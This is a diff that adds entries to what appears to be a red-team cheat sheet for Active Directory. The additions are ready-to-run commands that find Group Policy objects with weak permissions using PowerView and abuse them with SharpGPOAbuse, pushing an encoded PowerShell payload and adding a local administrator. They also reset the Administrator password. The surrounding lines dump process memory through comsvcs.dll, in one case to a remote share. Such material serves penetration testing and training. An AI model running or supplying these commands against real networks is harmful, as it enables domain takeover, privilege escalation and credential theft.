@@ -1478,6 +1478,26 @@ $targetPath = $sh.CreateShortcut('C:\Users\Public\Desktop\shortcut.lnk')
 $targetPath
 ```
 
+### Abusing Weak GPO Permissions
+
+```bash
+=> Find Vulnerable GPO (Using PowerView)
+$ Get-DomainObjectAcl -Identity "GPOName" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
+$ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+$ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ?{($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}}
+
+=> Abuse Using SharpGPOAbuse
+$ https://github.com/FSecureLABS/SharpGPOAbuse
+$ .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author bank.local\administrator --Command "cmd.exe" --Arguments "/c powershell.exe -e <BASE64>" --GPOName "Vulnerable GPO"
+$ .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author bank.local\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators nik /add" --GPOName "Vulnerable GPO"
+$ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount nik --GPOName "Vulnerable GPO"
+$ gpupdate /force
+
+=> References
+$ https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#abusing-weak-gpo-permissions
+$ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo
+```
+
 ### Active Directory Enumeration
 
 ```bash
@@ -1518,6 +1538,9 @@ $ dir *flag* /s /b
 => winrs
 $ winrs.exe -r:WEB01APP hostname
 
+=> Change Password User
+$ net user Administrator Passw0rd@123!
+
 => Dump process or pid
 $ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] dump.bin full
 $ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] \\10.10.10.10\public\dump.bin full
@@ -1547,6 +1570,7 @@ $ neo4j:neo4j
 # References
 https://www.vincentyiu.com/red-team-tips
 https://vysecurity.rocks/
+https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
 ```
 
 ### Rubeus
@@ -1879,6 +1903,8 @@ $ Get-NetForestTrust
 $ (get-domaincomputer -domain bank.local).dnshostname
 $ Get-NetLoggedon
 $ Get-NetProcess
+$ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+$ Get-DomainObjectAcl -Identity "GPOName" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
 $ Invoke-ShareFinder
 $ Invoke-UserHunter
 
